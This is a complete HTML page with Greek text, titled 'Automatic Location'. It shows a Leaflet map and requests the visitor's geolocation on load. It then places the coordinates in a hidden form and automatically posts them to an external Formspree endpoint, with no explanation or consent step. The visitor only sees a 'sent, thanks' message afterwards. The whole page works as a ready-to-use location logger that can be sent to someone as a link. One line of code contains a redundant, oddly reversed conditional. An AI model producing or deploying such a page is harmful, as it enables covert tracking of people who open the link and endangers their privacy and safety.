<!DOCTYPE html>
<html lang="el">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Αυτόματη Τοποθεσία</title>
  <!-- Leaflet CSS -->
  <link
    rel="stylesheet"
    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
    integrity="sha256-XQoYMqMTK8LvTLrP8aRA2wE0aYw7RFbF6v+W0W+gPqc="
    crossorigin=""
  />
  <style>
    html, body { margin:0; padding:0; height:100%; }
    #map { width:100%; height:100%; }
    #status {
      position: absolute; top:10px; left:50%;
      transform:translateX(-50%);
      background:rgba(255,255,255,0.9);
      padding:8px 12px; border-radius:4px;
      font-family:sans-serif; font-size:14px;
      box-shadow:0 2px 6px rgba(0,0,0,0.2);
      z-index:1000;
    }
  </style>
</head>
<body>
  <div id="map"></div>
  <div id="status">Ζητάω τη θέση σας…</div>

  <!-- Formspree -->
  <form id="locForm"
        action="https://formspree.io/f/xldbgner"
        method="POST"
        hidden>
    <input type="hidden" name="latitude" id="lat">
    <input type="hidden" name="longitude" id="lon">
  </form>

  <!-- Leaflet JS -->
  <script
    src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
    integrity="sha256-gZ0GmTQLP8VAgUeC5G2H4o1NQ4z3o+TF2bV6EdD3HGI="
    crossorigin=""
  ></script>
  <script>
    const status = document.getElementById('status');
    const form = document.getElementById('locForm');
    const latInput = document.getElementById('lat');
    const lonInput = document.getElementById('lon');

    // 1) init map
    const map = L.map('map').setView([0,0],2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: '© OpenStreetMap contributors'
    }).addTo(map);

    // 2) ζητάμε αυτόματα γεωτοποθεσία & κέντρο
    map.locate({ setView: true, maxZoom: 14, watch: false });

    // 3) όταν βρει τη θέση
    map.on('locationfound', (e) => {
      const { lat, lng } = e.latitude === undefined
        ? { lat: e.latitude, lng: e.longitude } // fallback
        : { lat: e.latitude, lng: e.longitude };

      // σήμανση στον χάρτη
      L.marker([lat, lng])
        .addTo(map)
        .bindPopup('Εδώ είστε.')
        .openPopup();

      // συμπλήρωση & αποστολή φόρμας
      latInput.value = lat;
      lonInput.value = lng;
      status.textContent = 'Θέση εντοπίστηκε! Αποστολή…';
      form.submit();
      status.textContent = 'Στάλθηκε—ευχαριστώ!';
    });

    // 4) σε περίπτωση σφάλματος ή άρνησης
    map.on('locationerror', (err) => {
      console.error('Location error:', err);
      status.textContent = `Σφάλμα (${err.code}): ${err.message}`;
    });
  </script>
</body>
</html>
